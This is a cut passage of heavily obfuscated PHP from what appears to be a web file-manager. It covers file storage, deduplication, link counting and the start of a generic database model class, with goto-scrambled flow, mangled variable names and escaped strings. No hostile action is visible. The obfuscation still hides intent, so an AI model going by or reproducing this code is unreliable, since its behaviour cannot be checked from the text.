$A®†½ƒ¨¶[$cº¤ÃÔ— ‡[530]] = $a¿äÔµß±š[$A®†½ƒ¨¶[$cº¤ÃÔ— ‡[1404]]]; if (isset($A®†½ƒ¨¶[$cº¤ÃÔ— ‡[2108]])) { $A®†½ƒ¨¶[$cº¤ÃÔ— ‡[2108]][$cº¤ÃÔ— ‡[530]] = $a¿äÔµß±š[$A®†½ƒ¨¶[$cº¤ÃÔ— ‡[2108]][$cº¤ÃÔ— ‡[1404]]]; } } goto Fì˜µßÆ‘‰; bÊ¸³æÀä: if (count($e×êÒ”Î›‰) == 0) { return; } foreach ($dÜ±Ç²’º as $A®†½ƒ¨¶) { if (isset($A®†½ƒ¨¶[$cº¤ÃÔ— ‡[2108]])) { $e×êÒ”Î›‰[] = $A®†½ƒ¨¶[$cº¤ÃÔ— ‡[2108]][$cº¤ÃÔ— ‡[1404]]; } } $a¿äÔµß±š = Model($cº¤ÃÔ— ‡[472])->userListInfo($e×êÒ”Î›‰); goto CÄ¬–Û×¿â; Fì˜µßÆ‘‰: } private function _listAppendMeta(&$DŞñï¤ÍŒ) { goto CÑ£éİÃ“; c²“‹Óê³ò: if (!$DŒˆ´ÛŸø™) { return; } foreach ($DŞñï¤ÍŒ as $E¯âœè‹) { if (isset($E¯âœè‹[$bš½¿‹šÙ[2108]])) { $DŒˆ´ÛŸø™[] = $E¯âœè‹[$bš½¿‹šÙ[2108]][$bš½¿‹šÙ[2105]]; } } $CÑĞ¶“×Ìã = $this->metaList($DŒˆ´ÛŸø™); goto a£ñ‡Ï‚—‘; a£ñ‡Ï‚—‘: if (!$CÑĞ¶“×Ìã) { return !1; } foreach ($DŞñï¤ÍŒ as &$E¯âœè‹) { $E¯âœè‹[$bš½¿‹šÙ[412]] = $CÑĞ¶“×Ìã[$E¯âœè‹[$bš½¿‹šÙ[2105]]]; if (isset($E¯âœè‹[$bš½¿‹šÙ[2108]])) { $E¯âœè‹[$bš½¿‹šÙ[2108]][$bš½¿‹šÙ[412]] = $CÑĞ¶“×Ìã[$E¯âœè‹[$bš½¿‹šÙ[2108]][$bš½¿‹šÙ[2105]]]; } } goto B ƒáÚ¤‘Î; CÑ£éİÃ“: $bš½¿‹šÙ =& $_SERVER[õëù©û]; $DŒˆ´ÛŸø™ = array_unique(array_to_keyvalue($DŞñï¤ÍŒ, $bš½¿‹šÙ[33], $bš½¿‹šÙ[2105])); $DŒˆ´ÛŸø™ = array_remove_value($DŒˆ´ÛŸø™, $bš½¿‹šÙ[463]); goto c²“‹Óê³ò; B ƒáÚ¤‘Î: } private function metaList($Aä¨İµ†Áë) { goto f—¢’‡Ã‡º; f—¢’‡Ã‡º: $BÒöš®ï’ç =& $_SERVER[õëù©û]; if (!$Aä¨İµ†Áë) { return array(); } $cÄ„è÷Ë¯¤ = array($BÒöš®ï’ç[2105] => array($BÒöš®ï’ç[7], $Aä¨İµ†Áë)); goto C…ÜÕª¯æ; C…ÜÕª¯æ: $e£œ¹çó’— = Model($BÒöš®ï’ç[2109])->where($cÄ„è÷Ë¯¤)->select(); $e£œ¹çó’— = array_to_keyvalue_group($e£œ¹çó’—, $BÒöš®ï’ç[2105]); foreach ($e£œ¹çó’— as $cÎ—‘†Ï‰¶ => $c“¬çÅã„ß) { $fˆİ±©ïğ = array(); foreach ($c“¬çÅã„ß as $A’òğŒ«ÄÜ) { $fˆİ±©ïğ[$A’òğŒ«ÄÜ[$BÒöš®ï’ç[89]]] = $A’òğŒ«ÄÜ[$BÒöš®ï’ç[355]]; } $e£œ¹çó’—[$cÎ—‘†Ï‰¶] = $fˆİ±©ïğ; } goto fí¥¬ÕÃ‚À; fí¥¬ÕÃ‚À: return $e£œ¹çó’— ? $e£œ¹çó’— : array(); goto FÒÆ²ÊÈ·Ï; FÒÆ²ÊÈ·Ï: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\155\x65" => "\x69\157\137\146\151\154\x65\137\x6d\145\164\x61", "\155\x65\164\141\106\x69\145\x6c\x64" => "\146\x69\x6c\145\x49\104"); public function fileInfo($BƒŠš£âØ) { $cëÄÙÅ”Âå =& $_SERVER[õëù©û]; static $dä„ÇÇ²¤÷ = array(); if (!isset($dä„ÇÇ²¤÷[$BƒŠš£âØ])) { $B¤ğÙÑ‰§ß = $cëÄÙÅ”Âå[2110]; $a¶Â†ÎÉğ¸ = Model($cëÄÙÅ”Âå[417])->field($B¤ğÙÑ‰§ß)->where(array($cëÄÙÅ”Âå[415] => $BƒŠš£âØ))->find(); $dä„ÇÇ²¤÷[$BƒŠš£âØ] = $a¶Â†ÎÉğ¸; } return $dä„ÇÇ²¤÷[$BƒŠš£âØ]; } public function addFileByContent($aö•Ü„¿‚¹ = '', $C”ö¨…Ãó‹ = '') { goto fîŠ“‘ÒÏÖ; D²è­¶¨øõ: $eèİ‰©è¥ë = $fô´ğŞïÌ . $FÕ¯ŒÎ¸×á[2112] . rand_string(16); file_put_contents($eèİ‰©è¥ë, $aö•Ü„¿‚¹); $A»ÀÔ İ–‡ = $this->addFile($eèİ‰©è¥ë, $C”ö¨…Ãó‹, !0); goto EÚ”Û×ÃŒ¤; EÚ”Û×ÃŒ¤: if (file_exists($eèİ‰©è¥ë)) { @unlink($eèİ‰©è¥ë); } return $A»ÀÔ İ–‡; goto CĞ“‘¹ğ‡·; fîŠ“‘ÒÏÖ: $FÕ¯ŒÎ¸×á =& $_SERVER[õëù©û]; $fô´ğŞïÌ = TEMP_PATH . $FÕ¯ŒÎ¸×á[2111]; if (!is_dir($fô´ğŞïÌ)) { mk_dir($fô´ğŞïÌ); } goto D²è­¶¨øõ; CĞ“‘¹ğ‡·: } public function createFileName($aª¶ó¸†) { goto E§¶ôøé¦; E§¶ôøé¦: $CñÕÎØâöÉ =& $_SERVER[õëù©û]; $aôÃô‘Â‘ª = IO::init($CñÕÎØâöÉ[8]); $e«—É“íÑ = $this->makeFilePath($aª¶ó¸†, $aôÃô‘Â‘ª); goto côå†Œò÷; côå†Œò÷: $Dğ·ÎÁœà¹ = $aôÃô‘Â‘ª->pathFather($e«—É“íÑ); static $AÁšŸ˜êè± = false; $DØ­òÔ›Ø¦ = $CñÕÎØâöÉ[2113] . md5($Dğ·ÎÁœà¹); goto C°ÈË©Ç; C°ÈË©Ç: if (!$AÁšŸ˜êè± && !Cache::get($DØ­òÔ›Ø¦)) { $AÁšŸ˜êè± = !0; $A÷ÅÖËÂÈğ = IO::mkdir($Dğ·ÎÁœà¹); if (!IO::exist($A÷ÅÖËÂÈğ . $CñÕÎØâöÉ[2114])) { IO::mkfile($A÷ÅÖËÂÈğ . $CñÕÎØâöÉ[2114]); } Cache::set($DØ­òÔ›Ø¦, 1, 3600 * 2); } return $e«—É“íÑ; goto eŒôæ•Öà‰; eŒôæ•Öà‰: } public function makeFilePath($bÉŠ’½¶¦‹, $A¥´Ÿ¾§§ñ) { goto cæ‡ÃîÍ¸¤; c¢ˆàª–É: switch ($bôÆ™Û¡“Á) { case $d²©æòƒ¥›[2118]: $FŒÍî–š± = $FŒÍî–š± . $d²©æòƒ¥›[91] . $A¥´Ÿ¾§§ñ->ext($bÉŠ’½¶¦‹); if ($A¥´Ÿ¾§§ñ->ext($bÉŠ’½¶¦‹) == $d²©æòƒ¥›[2058]) { $FŒÍî–š± .= $d²©æòƒ¥›[2119]; } break; case $d²©æòƒ¥›[2120]: goto d÷ô†›„ëÄ; Dôà¨„© š: break; goto E²…ÌÇÜêë; d…ØÔ½—Û½: if ($A¥´Ÿ¾§§ñ->ext($bÉŠ’½¶¦‹) == $d²©æòƒ¥›[2058]) { $bÉŠ’½¶¦‹ .= $d²©æòƒ¥›[2119]; } $c«Şµïáäƒ = IO::fileNameAuto($DÍÊº™•øÒ, $bÉŠ’½¶¦‹); $FŒÍî–š± = $DÍÊº™•øÒ . $c«Şµïáäƒ; goto Dôà¨„© š; d÷ô†›„ëÄ: $cïÌá£‡‹¯ = Model($d²©æòƒ¥›[1079])->get($d²©æòƒ¥›[1303]); $cÀ£×´İØ = substr(md5($d²©æòƒ¥›[1878] . $cïÌá£‡‹¯ . date($d²©æòƒ¥›[682])), 0, 8); $DÍÊº™•øÒ = KodIO::defaultIO() . date($d²©æòƒ¥›[2121]) . $cÀ£×´İØ . $d²©æòƒ¥›[8]; goto d…ØÔ½—Û½; E²…ÌÇÜêë: case $d²©æòƒ¥›[2117]: break; default: break; } return $FŒÍî–š±; goto E ™‘â¸à; cæ‡ÃîÍ¸¤: $d²©æòƒ¥› =& $_SERVER[õëù©û]; $bôÆ™Û¡“Á = Model($d²©æòƒ¥›[1079])->get($d²©æòƒ¥›[2115]); $DÍÊº™•øÒ = KodIO::defaultIO() . date($d²©æòƒ¥›[2116]); goto D§ÀŞ‹™¹×; D§ÀŞ‹™¹×: $FŒÍî–š± = $DÍÊº™•øÒ . rand_string(5) . short_id(100); $bÉŠ’½¶¦‹ = str_replace($d²©æòƒ¥›[8], $d²©æòƒ¥›[70], KodIO::clear($bÉŠ’½¶¦‹)); if (!$bÉŠ’½¶¦‹) { $bôÆ™Û¡“Á = $d²©æòƒ¥›[2117]; } goto c¢ˆàª–É; E ™‘â¸à: } public function addFileByRemote($e…™Ôâøá, $BìñæËÛî, $b™›ì¢ß…Â = array()) { goto bº÷ÇÖÀ«; E±·² ä™Œ: $d¤â˜ÒÜ = IO::hashMd5($e…™Ôâøá, $EÔŠœ´¯“ˆ); $B¹¤¯Ã¢Ë³ = KodIO::defaultDriver(); $D°®ò¿Òª = array($CÂŞ‘ÖÉÜ[515] => IO::size($e…™Ôâøá), $CÂŞ‘ÖÉÜ[2122] => 1, $CÂŞ‘ÖÉÜ[382] => $BìñæËÛî, $CÂŞ‘ÖÉÜ[730] => $B¹¤¯Ã¢Ë³[$CÂŞ‘ÖÉÜ[363]], $CÂŞ‘ÖÉÜ[383] => $e…™Ôâøá, $CÂŞ‘ÖÉÜ[2123] => $b™›ì¢ß…Â[$CÂŞ‘ÖÉÜ[160]] ? $b™›ì¢ß…Â[$CÂŞ‘ÖÉÜ[160]] : IO::hashSimple($e…™Ôâøá), $CÂŞ‘ÖÉÜ[2124] => $d¤â˜ÒÜ ? $d¤â˜ÒÜ : $EÔŠœ´¯“ˆ); goto fÕÍ¡ÅêŠ; bº÷ÇÖÀ«: $CÂŞ‘ÖÉÜ =& $_SERVER[õëù©û]; if (!IO::exist($e…™Ôâøá)) { return !1; } $EÔŠœ´¯“ˆ = $b™›ì¢ß…Â[$CÂŞ‘ÖÉÜ[159]] ? $b™›ì¢ß…Â[$CÂŞ‘ÖÉÜ[159]] : $CÂŞ‘ÖÉÜ[33]; goto E±·² ä™Œ; fÕÍ¡ÅêŠ: if ($dá©†ÜãÒõ = $this->addFileCheckExist($D°®ò¿Òª[$CÂŞ‘ÖÉÜ[160]], $D°®ò¿Òª[$CÂŞ‘ÖÉÜ[159]], $D°®ò¿Òª[$CÂŞ‘ÖÉÜ[77]])) { return $dá©†ÜãÒõ; } return $this->addFileData($D°®ò¿Òª); goto Fä®Å„‹; Fä®Å„‹: } private function addFileData($B¨¤³¥¶º©) { $dµ¦¥ÀçÒ“ =& $_SERVER[õëù©û]; if (!$B¨¤³¥¶º©) { return !1; } $B¨¤³¥¶º©[$dµ¦¥ÀçÒ“[77]] = intval($B¨¤³¥¶º©[$dµ¦¥ÀçÒ“[77]]); if (!$B¨¤³¥¶º©[$dµ¦¥ÀçÒ“[77]] && strlen($B¨¤³¥¶º©[$dµ¦¥ÀçÒ“[160]]) > 32) { $B¨¤³¥¶º©[$dµ¦¥ÀçÒ“[77]] = intval(substr($B¨¤³¥¶º©[$dµ¦¥ÀçÒ“[160]], 32)); } $eÊÁéÎÊÆˆ = $this->add($B¨¤³¥¶º©); return $this->find($eÊÁéÎÊÆˆ); } public function addFile($B™«àò¹ÂÂ, $A”Õ±Œ’—, $aÚ˜º¥Ù„ = false) { $E„«ö§ ´½ = IO::hashSimple($B™«àò¹ÂÂ); $E”Ê—ñ»¾ = IO::hashMd5($B™«àò¹ÂÂ); $fà¹ìçŠá = IO::size($B™«àò¹ÂÂ); if ($e©•í×Ì°™ = $this->addFileCheckExist($E„«ö§ ´½, $E”Ê—ñ»¾, $fà¹ìçŠá)) { return $e©•í×Ì°™; } $EŒõŸ„£¨ = $this->addFileMake($B™«àò¹ÂÂ, $fà¹ìçŠá, $E„«ö§ ´½, $E”Ê—ñ»¾, $A”Õ±Œ’—, $aÚ˜º¥Ù„); return $this->addFileData($EŒõŸ„£¨); } public function addFileMake($e½ŞÈÃÂ‰à, $bÏêéµÓêğ, $d¢ìÉÑÍ³÷, $e×•à¦Èæƒ, $aÁæÓ¥Ã, $AÉæ¦åİ‰‡) { goto fêøŒ‚…ø; D¹‹”£ê‡Ù: $C¨•Ëù…Ş = get_path_this($F¢¾ÙØ¹¾); if ($AÉæ¦åİ‰‡) { $A÷ìç´ÃòĞ = IO::move($e½ŞÈÃÂ‰à, $fĞøÂË‰, !1, $C¨•Ëù…Ş); } else { $A÷ìç´ÃòĞ = IO::copy($e½ŞÈÃÂ‰à, $fĞøÂË‰, !1, $C¨•Ëù…Ş); } if (!$A÷ìç´ÃòĞ) { return !1; } goto F šÛñÃ¨; fêøŒ‚…ø: $FÌÕİ¹ =& $_SERVER[õëù©û]; $F¢¾ÙØ¹¾ = $this->createFileName($aÁæÓ¥Ã); $fĞøÂË‰ = get_path_father($F¢¾ÙØ¹¾); goto D¹‹”£ê‡Ù; F šÛñÃ¨: $e½ÓñôÙ¹Ó = KodIO::defaultDriver(); $fÖ™¥‡–İ² = array($FÌÕİ¹[515] => $bÏêéµÓêğ, $FÌÕİ¹[2122] => 1, $FÌÕİ¹[382] => $aÁæÓ¥Ã, $FÌÕİ¹[730] => $e½ÓñôÙ¹Ó[$FÌÕİ¹[363]], $FÌÕİ¹[383] => $F¢¾ÙØ¹¾, $FÌÕİ¹[2123] => $d¢ìÉÑÍ³÷, $FÌÕİ¹[2124] => $e×•à¦Èæƒ); return $fÖ™¥‡–İ²; goto c“ïÕ…Ò«ë; c“ïÕ…Ò«ë: } public function addFileCheckExist($dÙ®ÂÁÁ¢, $c“†Â—¤², $AÙĞöîÕ¥¡) { $c¥èÛ÷šƒ =& $_SERVER[õëù©û]; $eğ¿à™ÛÑ = $this->findByHash($dÙ®ÂÁÁ¢, $c“†Â—¤²); if (!$eğ¿à™ÛÑ) { return !1; } $AÓ–¼˜Â‡ = array($c¥èÛ÷šƒ[2122] => intval($eğ¿à™ÛÑ[$c¥èÛ÷šƒ[2125]]) + 1, $c¥èÛ÷šƒ[515] => $AÙĞöîÕ¥¡); $this->where(array($c¥èÛ÷šƒ[415] => $eğ¿à™ÛÑ[$c¥èÛ÷šƒ[414]]))->save($AÓ–¼˜Â‡); return $eğ¿à™ÛÑ; } public function remove($A¸ËÚòñœ•) { $this->linkCountChange($A¸ËÚòñœ•, !1); $this->clearEmpty(); return !0; } public function linkAdd($E•È¸»‰ÕÌ) { $this->linkCountChange($E•È¸»‰ÕÌ, !0); } public function linkCountChange($A›˜¬Ï˜×Û, $CÜ×¥® Ü) { goto EŞ™ª›ÕÔ ; f‹ÌöÑİõ´: foreach ($FÂâõò‘Í as $dËˆå‡¯™‰ => $FÃÎ½Úãœ) { $AÑÅ¥”âæŒ = $FÃÎ½Úãœ . $fœ¾ÀŠœÁ¦[33]; if (!$DÓ»•“â‚˜[$AÑÅ¥”âæŒ]) { $DÓ»•“â‚˜[$AÑÅ¥”âæŒ] = array(); } $DÓ»•“â‚˜[$AÑÅ¥”âæŒ][] = $dËˆå‡¯™‰; } foreach ($DÓ»•“â‚˜ as $FÃÎ½Úãœ => $d„ˆ…½áˆ) { if (!$d„ˆ…½áˆ) { continue; } $FÃÎ½Úãœ = $CÜ×¥® Ü ? $FÃÎ½Úãœ : -intval($FÃÎ½Úãœ); $e‰²Ğà¤‹Ê = array($fœ¾ÀŠœÁ¦[414] => array($fœ¾ÀŠœÁ¦[7], $d„ˆ…½áˆ)); if ($FÃÎ½Úãœ < 0) { $e‰²Ğà¤‹Ê[$fœ¾ÀŠœÁ¦[2125]] = array($fœ¾ÀŠœÁ¦[922], abs($FÃÎ½Úãœ)); } $this->where($e‰²Ğà¤‹Ê)->setAdd($fœ¾ÀŠœÁ¦[2125], $FÃÎ½Úãœ); } goto fï¾ŞË§ŞŞ; EŞ™ª›ÕÔ : $fœ¾ÀŠœÁ¦ =& $_SERVER[õëù©û]; if (!$A›˜¬Ï˜×Û) { return; } if (!is_array($A›˜¬Ï˜×Û)) { $A›˜¬Ï˜×Û = array($A›˜¬Ï˜×Û); } goto aõì¶®Ê¿Û; aõì¶®Ê¿Û: $FÂâõò‘Í = array(); foreach ($A›˜¬Ï˜×Û as $dËˆå‡¯™‰) { $AÑÅ¥”âæŒ = $dËˆå‡¯™‰ . $fœ¾ÀŠœÁ¦[33]; if (!$FÂâõò‘Í[$AÑÅ¥”âæŒ]) { $FÂâõò‘Í[$AÑÅ¥”âæŒ] = 0; } $FÂâõò‘Í[$AÑÅ¥”âæŒ]++; } $DÓ»•“â‚˜ = array(); goto f‹ÌöÑİõ´; fï¾ŞË§ŞŞ: } public function findByHash($E§Ç‚öº¨è, $e“ôÚº¾ë¸ = false) { $B¢¶Ñ‘õ†ë =& $_SERVER[õëù©û]; if (!$E§Ç‚öº¨è && !$e“ôÚº¾ë¸) { return !1; } $D¼…£•˜ßõ = array($B¢¶Ñ‘õ†ë[2123] => $E§Ç‚öº¨è); if ($e“ôÚº¾ë¸) { $D¼…£•˜ßõ = array($B¢¶Ñ‘õ†ë[2124] => $e“ôÚº¾ë¸); } return $this->order($B¢¶Ñ‘õ†ë[2126])->where($D¼…£•˜ßõ)->find(); } public function clearEmpty($fÈ¼’Û…´ğ = 0) { goto DÍ¨áíŸéï; eİ±‘…ÍÒ: foreach ($e¡Øºšâ‚ as $e­ôÜ»ĞË) { $eŠïÈÌÂÒ->update(1); $this->resetFile($e­ôÜ»ĞË); } $eŠïÈÌÂÒ->end(); goto d¹‰Ø£Œî‹; a¯ºƒ…Ášô: $e¡Øºšâ‚ = $this->where($B±˜Ğ‡¥àï)->select(); if (!$e¡Øºšâ‚) { return; } $eŠïÈÌÂÒ = new Task($e¼õŒÎ¬ó’[2128], $e¼õŒÎ¬ó’[33], count($e¡Øºšâ‚)); goto eİ±‘…ÍÒ; DÍ¨áíŸéï: $e¼õŒÎ¬ó’ =& $_SERVER[õëù©û]; $e©ãç¶ìíï = time() - 3600 * 24 * $fÈ¼’Û…´ğ; $B±˜Ğ‡¥àï = $e¼õŒÎ¬ó’[2127] . $e©ãç¶ìíï; goto a¯ºƒ…Ášô; d¹‰Ø£Œî‹: } private function resetFile($Dì³ë÷¼ò–) { goto B¿Ö«¤’ÇŠ; B¿Ö«¤’ÇŠ: $b…Ò‘éÁ =& $_SERVER[õëù©û]; $EŠî£·¾å› = array($b…Ò‘éÁ[415] => $Dì³ë÷¼ò–[$b…Ò‘éÁ[414]]); $bÌğÎ™÷ª = Model($b…Ò‘éÁ[1101])->where($EŠî£·¾å›)->count(); goto A²„—¦éù’; DÕöô¿¼š: if ($Dì³ë÷¼ò–[$b…Ò‘éÁ[2125]] != $AºĞ”Ó±ÁÌ) { $this->where($EŠî£·¾å›)->save(array($b…Ò‘éÁ[2122] => $AºĞ”Ó±ÁÌ)); } goto f ÖÂ¦Ó¬Ì; A²„—¦éù’: $AïãìŸøÑØ = Model($b…Ò‘éÁ[2129])->where($EŠî£·¾å›)->count(); $AºĞ”Ó±ÁÌ = intval($bÌğÎ™÷ª) + intval($AïãìŸøÑØ); if ($AºĞ”Ó±ÁÌ == 0) { IO::remove($Dì³ë÷¼ò–[$b…Ò‘éÁ[75]]); $this->where($EŠî£·¾å›)->delete(); $this->metaSet($Dì³ë÷¼ò–[$b…Ò‘éÁ[414]], null, null); return; } goto DÕöô¿¼š; f ÖÂ¦Ó¬Ì: } public function storageInfo($DÜ¾‹Û¶¬Æ = false) { goto A‡ì¶¸É™; e°š÷êŞ…: $a”²µÈÄÈ  = 1; $Aéã¼µß‚¼ = 0; $eê”î¯‘Ÿª = 5000; goto eœ§•¢Ø†; eœ§•¢Ø†: for ($D¥ Ğ¿Æ = 0; $D¥ Ğ¿Æ < $D–à¥‘ãï; $D¥ Ğ¿Æ = $D¥ Ğ¿Æ + $eê”î¯‘Ÿª) { $e”‰¯ËÉ‰ä = $this->limit($D¥ Ğ¿Æ, $D¥ Ğ¿Æ + $eê”î¯‘Ÿª)->select(); foreach ($e”‰¯ËÉ‰ä as $a‹¿¯Ö—öÖ) { $a”²µÈÄÈ  += $a‹¿¯Ö—öÖ[$cèÀìÓ³×›[77]] * $a‹¿¯Ö—öÖ[$cèÀìÓ³×›[2125]]; $dæ¥®ßìØ¤ += $a‹¿¯Ö—öÖ[$cèÀìÓ³×›[77]] * ($a‹¿¯Ö—öÖ[$cèÀìÓ³×›[2125]] - 1); $Aéã¼µß‚¼ += $a‹¿¯Ö—öÖ[$cèÀìÓ³×›[2125]]; } } $E­ÅŞó«¡‡ = array($cèÀìÓ³×›[2130] => $a”²µÈÄÈ , $cèÀìÓ³×›[2131] => $dæ¥®ßìØ¤, $cèÀìÓ³×›[2132] => $dæ¥®ßìØ¤ / $a”²µÈÄÈ , $cèÀìÓ³×›[81] => $D–à¥‘ãï, $cèÀìÓ³×›[2133] => $Aéã¼µß‚¼); return $E­ÅŞó«¡‡; goto bÜÆö­¶ˆ•; A‡ì¶¸É™: $cèÀìÓ³×› =& $_SERVER[õëù©û]; $D–à¥‘ãï = $this->count() + 0.0; $dæ¥®ßìØ¤ = 0; goto e°š÷êŞ…; bÜÆö­¶ˆ•: } } goto eËïèèÔ»„; aî›”ĞÅâ: define($_SERVER[õëù©û][226], 0); define($_SERVER[õëù©û][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\157\162\x64\x65\162", "\141\154\x69\141\163", "\x68\141\166\151\x6e\x67", "\x67\162\x6f\x75\160", "\154\157\143\x6b", "\x64\x69\x73\164\151\156\143\164", "\x61\x75\164\157", "\x66\x69\x6c\x74\145\162", "\x76\141\x6c\x69\x64\141\164\x65", "\162\x65\163\165\x6c\164", "\142\x69\156\144", "\164\x6f\x6b\x65\x6e"); public function __construct($c®…•–çÁÇ = '', $F™¾÷Ø¶³ = '', $f´ëç ‹‘½ = '') { $dùˆ³ÕƒÛ =& $_SERVER[õëù©û]; $this->_initialize(); if (!empty($c®…•–çÁÇ)) { if (strpos($c®…•–çÁÇ, $dùˆ³ÕƒÛ[91])) { list($this->dbName, $this->name) = explode($dùˆ³ÕƒÛ[91], $c®…•–çÁÇ); } else { $this->name = $c®…•–çÁÇ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F™¾÷Ø¶³)) { $this->tablePrefix = $dùˆ³ÕƒÛ[33]; } elseif ($dùˆ³ÕƒÛ[33] != $F™¾÷Ø¶³) { $this->tablePrefix = $F™¾÷Ø¶³; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($dùˆ³ÕƒÛ[228]); } $this->db(0, empty($this->connection) ? $f´ëç ‹‘½ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eñ‚Ï°§° =& $_SERVER[õëù©û]; if (empty($this->fields)) { if (think_config($eñ‚Ï°§°[229])) { $C¯ÔÙ¬å›” = $this->dbName ? $this->dbName : think_config($eñ‚Ï°§°[230]); $a±„›ÃŒ« = think_var_cache($eñ‚Ï°§°[231] . strtolower(get_path_this($C¯ÔÙ¬å›”) . $eñ‚Ï°§°[91] . $this->name)); if ($a±„›ÃŒ«) { $E›ºùåÃˆŠ = think_config($eñ‚Ï°§°[232]); if (empty($E›ºùåÃˆŠ) || $a±„›ÃŒ«[$eñ‚Ï°§°[233]] == $E›ºùåÃˆŠ) { $this->fields = $a±„›ÃŒ«; return; } } } $this->flush(); } } public function flush() { goto b¨œğ†µ¹·; b¨œğ†µ¹·: $C¿×¿Ÿ½¾Õ =& $_SERVER[õëù©û]; $this->db->setModel($this->name); $aŸìõ‹¤¦í = $this->db->getFields($this->getTableName()); goto f“ù¸˜ø¼°; f“ù¸˜ø¼°: if (!$aŸìõ‹¤¦í) { return !1; } $this->fields = array_keys($aŸìõ‹¤¦í); $this->fields[$C¿×¿Ÿ½¾Õ[234]] = !1; goto a«ˆ½¬à÷; A‚² †¥‡¤: if (think_config($C¿×¿Ÿ½¾Õ[229])) { $b¯ÚÆ¬Ü†» = $this->dbName ? $this->dbName : think_config($C¿×¿Ÿ½¾Õ[230]); think_var_cache($C¿×¿Ÿ½¾Õ[231] . strtolower(get_path_this($b¯ÚÆ¬Ü†») . $C¿×¿Ÿ½¾Õ[91] . $this->name), $this->fields); } goto dÛá†ÈÆª; a«ˆ½¬à÷: foreach ($aŸìõ‹¤¦í as $Eƒ«´à‚Ñö => $CÑÆ¢Ç‰Ø) { $bÎÕ„[$Eƒ«´à‚Ñö] = $CÑÆ¢Ç‰Ø[$C¿×¿Ÿ½¾Õ[29]]; if ($CÑÆ¢Ç‰Ø[$C¿×¿Ÿ½¾Õ[36]]) { $this->fields[$C¿×¿Ÿ½¾Õ[235]] = $Eƒ«´à‚Ñö; if ($CÑÆ¢Ç‰Ø[$C¿×¿Ÿ½¾Õ[39]]) { $this->fields[$C¿×¿Ÿ½¾Õ[234]] = !0; } } } $this->fields[$C¿×¿Ÿ½¾Õ[236]] = $bÎÕ„; if (think_config($C¿×¿Ÿ½¾Õ[232])) { $this->fields[$C¿×¿Ÿ½¾Õ[233]] = think_config($C¿×¿Ÿ½¾Õ[232]); } goto A‚² †¥‡¤; dÛá†ÈÆª: } public function switchModel($aÃ¬¹äõéÕ, $DÃùãé’ùÆ = array()) { $Fó†Şå§·Ê =& $_SERVER[õëù©û]; $eƒ¥î¸÷¹Œ = ucwords(strtolower($aÃ¬¹äõéÕ)) . $Fó†Şå§·Ê[237]; if (!class_exists($eƒ¥î¸÷¹Œ)) { think_exception($eƒ¥î¸÷¹Œ . think_lang($Fó†Şå§·Ê[238])); } $this->_extModel = new $eƒ¥î¸÷¹Œ($this->name); if (!empty($DÃùãé’ùÆ)) { foreach ($DÃùãé’ùÆ as $Fö©•ìáŒ”) { $this->_extModel->setProperty($Fö©•ìáŒ”, $this->{$Fö©•ìáŒ”}); } } return $this->_extModel; } public function __set($C«¼¿’¾ø, $bË†ïÛêç) { $this->data[$C«¼¿’¾ø] = $bË†ïÛêç; } public function __get($dëÛ¯¤¯¬õ) { return isset($this->data[$dëÛ¯¤¯¬õ]) ? $this->data[$dëÛ¯¤¯¬õ] : null; } public function __isset($CîÁ§ØÛØ) { return isset($this->data[$CîÁ§ØÛØ]); } public function __unset($D²îØÎÅ³») { unset($this->data[$D²îØÎÅ³»]); } public function __call($f†¸ĞĞæˆƒ, $d’ìÉÃÒµ) { $aÀ½Ñ‰«Å× =& $_SERVER[õëù©û]; if (in_array(strtolower($f†¸ĞĞæˆƒ), $this->methods, !0)) { $this->options[strtolower($f†¸ĞĞæˆƒ)] = $d’ìÉÃÒµ[0]; return $this; } elseif (in_array(strtolower($f†¸ĞĞæˆƒ), array($aÀ½Ñ‰«Å×[239], $aÀ½Ñ‰«Å×[240], $aÀ½Ñ‰«Å×[241], $aÀ½Ñ‰«Å×[242], $aÀ½Ñ‰«Å×[243]), !0)) { $a´ÛËô‘È– = isset($d’ìÉÃÒµ[0]) ? $d’ìÉÃÒµ[0] : $aÀ½Ñ‰«Å×[172]; $a´ÛËô‘È– = $this->db->parseKey($a´ÛËô‘È–); return $this->getField(strtoupper($f†¸ĞĞæˆƒ) . $aÀ½Ñ‰«Å×[244] . $a´ÛËô‘È– . $aÀ½Ñ‰«Å×[245] . $f†¸ĞĞæˆƒ, $aÀ½Ñ‰«Å×[239]); } elseif (strtolower(substr($f†¸ĞĞæˆƒ, 0, 5)) == $aÀ½Ñ‰«Å×[246]) { $a´ÛËô‘È– = think_parse_name(substr($f†¸ĞĞæˆƒ, 5)); $BìÎ¹Æç®È[$a´ÛËô‘È–] = $d’ìÉÃÒµ[0]; return $this->where($BìÎ¹Æç®È)->find(); } elseif (strtolower(substr($f†¸ĞĞæˆƒ, 0, 10)) == $aÀ½Ñ‰«Å×[247]) { $e×¯Ï±·«¹ = think_parse_name(substr($f†¸ĞĞæˆƒ, 10)); $BìÎ¹Æç®È[$e×¯Ï±·«¹] = $d’ìÉÃÒµ[0]; return $this->where($BìÎ¹Æç®È)->getField($d’ìÉÃÒµ[1]); } elseif (isset($this->_scope[$f†¸ĞĞæˆƒ])) { return $this->scope($f†¸ĞĞæˆƒ, $d’ìÉÃÒµ[0]); } elseif (method_exists($this, $f†¸ĞĞæˆƒ)) { array_unshift($d’ìÉÃÒµ, $f†¸ĞĞæˆƒ); return call_user_func_array(array($this, $aÀ½Ñ‰«Å×[248]), $d’ìÉÃÒµ); } else { return call_user_func_array(array(parent, $f†¸ĞĞæˆƒ), $d’ìÉÃÒµ); } } protected function call() { goto C—¹¥Â÷“¨; Dù­²œÛùÜ: $f¥áÌİªšË = call_user_func_array(array($this, $E¼Ì±“ÔåŞ), $c®’õ§Œ„°); if (method_exists($this, $e¡¦ÌˆË±[252])) { $cî°ŒòË¿ = call_user_func_array(array($this, 